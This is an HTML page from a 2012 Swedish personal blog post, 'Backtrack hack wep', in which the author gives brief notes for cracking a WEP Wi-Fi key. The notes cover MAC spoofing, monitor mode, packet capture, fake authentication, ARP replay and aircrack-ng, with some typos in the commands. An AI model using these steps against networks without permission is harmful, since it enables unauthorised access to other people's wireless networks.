@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Backtrack hack wep | Life and Shell</title>
+  <link rel = 'canonical' href = 'https://lifeandshell.com/posts/backtrack-hack-wep/'>
+  <meta name="description" content="  Mattias Hemmingsson: Welcome to my private site collecting blog post, Git updates and podcast episodes">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+
+
+
+ <script async src="https://www.googletagmanager.com/gtag/js?id=G-3SYH00HY9X"></script>
+ <script>
+   window.dataLayer = window.dataLayer || [];
+   function gtag(){dataLayer.push(arguments);}
+   gtag('js', new Date());
+   gtag('config', 'G-3SYH00HY9X');
+ </script>
+
+
+  <meta property="og:url" content="https://lifeandshell.com/posts/backtrack-hack-wep/">
+  <meta property="og:site_name" content="Life and Shell">
+  <meta property="og:title" content="Backtrack hack wep">
+  <meta property="og:description" content="Att hacka wep är en ganska lätt sak.
+WEP har nämligen ett fel i sig som gör att samlar man på sig tillräckligt många paket så kan man
+från paketen läsa ut vad wep nyckeln är.
+För att gör adet så behöver man först lyssna på en bassation som använder sig av WEP.
+Efter det är det bara att hitta så många paket som man behöver runt 20 000 stycken.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2012-02-11T15:11:44+00:00">
+    <meta property="article:modified_time" content="2012-02-11T15:11:44+00:00">
+    <meta property="article:tag" content="Security">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Backtrack hack wep">
+  <meta name="twitter:description" content="Att hacka wep är en ganska lätt sak.
+WEP har nämligen ett fel i sig som gör att samlar man på sig tillräckligt många paket så kan man
+från paketen läsa ut vad wep nyckeln är.
+För att gör adet så behöver man först lyssna på en bassation som använder sig av WEP.
+Efter det är det bara att hitta så många paket som man behöver runt 20 000 stycken.">
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://lifeandshell.com/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://lifeandshell.com/images/favicon.ico" />
+
+  
+  
+  
+
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts/">Writings</a></li>
+         
+        <li><a href="/tags/">Tags</a></li>
+         
+        <li><a href="/git/">Git</a></li>
+         
+        <li><a href="/podcast/">Podcast</a></li>
+         
+        <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://lifeandshell.com/posts/backtrack-mitt-startup-script/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://lifeandshell.com/posts/jfokus-2012/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&text=Backtrack%20hack%20wep" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&title=Backtrack%20hack%20wep" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&is_video=false&description=Backtrack%20hack%20wep" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Backtrack%20hack%20wep&body=Check out this article: https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&title=Backtrack%20hack%20wep" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&title=Backtrack%20hack%20wep" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&name=Backtrack%20hack%20wep&description=Att%20hacka%20wep%20%c3%a4r%20en%20ganska%20l%c3%a4tt%20sak.%0aWEP%20har%20n%c3%a4mligen%20ett%20fel%20i%20sig%20som%20g%c3%b6r%20att%20samlar%20man%20p%c3%a5%20sig%20tillr%c3%a4ckligt%20m%c3%a5nga%20paket%20s%c3%a5%20kan%20man%0afr%c3%a5n%20paketen%20l%c3%a4sa%20ut%20vad%20wep%20nyckeln%20%c3%a4r.%0aF%c3%b6r%20att%20g%c3%b6r%20adet%20s%c3%a5%20beh%c3%b6ver%20man%20f%c3%b6rst%20lyssna%20p%c3%a5%20en%20bassation%20som%20anv%c3%a4nder%20sig%20av%20WEP.%0aEfter%20det%20%c3%a4r%20det%20bara%20att%20hitta%20s%c3%a5%20m%c3%a5nga%20paket%20som%20man%20beh%c3%b6ver%20runt%2020%20000%20stycken." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&t=Backtrack%20hack%20wep" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Backtrack hack wep
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2012-02-11 15:11:44 &#43;0000 UTC" itemprop="datePublished">2012-02-11</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          1 minute read
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/security">Security</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/security" rel="tag">Security</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p>Att hacka wep är en ganska lätt sak.<br />
+WEP har nämligen ett fel i sig som gör att samlar man på sig tillräckligt många paket så kan man<br />
+från paketen läsa ut vad wep nyckeln är.</p>
+<p>För att gör adet så behöver man först lyssna på en bassation som använder sig av WEP.<br />
+Efter det är det bara att hitta så många paket som man behöver runt 20 000 stycken.<br />
+Man kan även &#8220;lura&#8221; basstaionen så den skickar på paket så man kommer upp i rätt mängd.</p>
+<p>Nedan följer mina antekningar om att knäcka WEP</p>
+<p>hitta stationen och kanalen med airdump.<br />
+Gl;minte at bta mac innan</p>
+<p>macchanger &#8211;mac 00:11:22:33:44:55</p>
+<p>ifconfig wlan1 up</p>
+<pre>
+airomon-zc start wlan1</p>
+</pre>
+<p>nu ska du ha en nic som heter mon0</p>
+<p>Den som vi ska anv&#8217;ndat</p>
+<p>#Borja sniffa fraffiken</p>
+<pre>
+airodump-ng -c channel -w filnamn --bssid macenene mon0 </p>
+</pre>
+<p>#byt ut de saker som behovs for att den ska passa</p>
+<p>#Kolla sa du kan auto mot den</p>
+<pre>
+aireplay-ng -1 0 -a bssid -h 00:11:22:33:44:55 -e essid</p>
+</pre>
+<p>#essid e acces pukten namn ssid<br />
+// du ska se en association successful 🙂 da e allt bra</p>
+<p>#borja lek med den sa vi far lite traffik<br />
+#du vill ha data upp till 10000</p>
+<pre>
+<p>aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 mon0<br />
+</pre>
+<p>#Du ska vi leka lite med acces punkten<br />
+#VAR FORSIKTIG INTERNNET KAN DO HOS DOM NU</p>
+<p>#Nu nar vi har manga paket kan vi testa att knacka wep nyckeln</p>
+<pre>
+<p>aircrack-ng -b (bssid)  filnamn</p>
+</pre>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts/">Writings</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/git/">Git</a></li>
+         
+          <li><a href="/podcast/">Podcast</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&text=Backtrack%20hack%20wep" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&title=Backtrack%20hack%20wep" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&is_video=false&description=Backtrack%20hack%20wep" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Backtrack%20hack%20wep&body=Check out this article: https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&title=Backtrack%20hack%20wep" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&title=Backtrack%20hack%20wep" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&name=Backtrack%20hack%20wep&description=Att%20hacka%20wep%20%c3%a4r%20en%20ganska%20l%c3%a4tt%20sak.%0aWEP%20har%20n%c3%a4mligen%20ett%20fel%20i%20sig%20som%20g%c3%b6r%20att%20samlar%20man%20p%c3%a5%20sig%20tillr%c3%a4ckligt%20m%c3%a5nga%20paket%20s%c3%a5%20kan%20man%0afr%c3%a5n%20paketen%20l%c3%a4sa%20ut%20vad%20wep%20nyckeln%20%c3%a4r.%0aF%c3%b6r%20att%20g%c3%b6r%20adet%20s%c3%a5%20beh%c3%b6ver%20man%20f%c3%b6rst%20lyssna%20p%c3%a5%20en%20bassation%20som%20anv%c3%a4nder%20sig%20av%20WEP.%0aEfter%20det%20%c3%a4r%20det%20bara%20att%20hitta%20s%c3%a5%20m%c3%a5nga%20paket%20som%20man%20beh%c3%b6ver%20runt%2020%20000%20stycken." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2flifeandshell.com%2fposts%2fbacktrack-hack-wep%2f&t=Backtrack%20hack%20wep" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2026  Mattias Hemmingssion <a href="mailto:mattias@lifeandshell.com">mattias@lifeandshell.com</a> 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts/">Writings</a></li>
+         
+        <li><a href="/tags/">Tags</a></li>
+         
+        <li><a href="/git/">Git</a></li>
+         
+        <li><a href="/podcast/">Podcast</a></li>
+         
+        <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
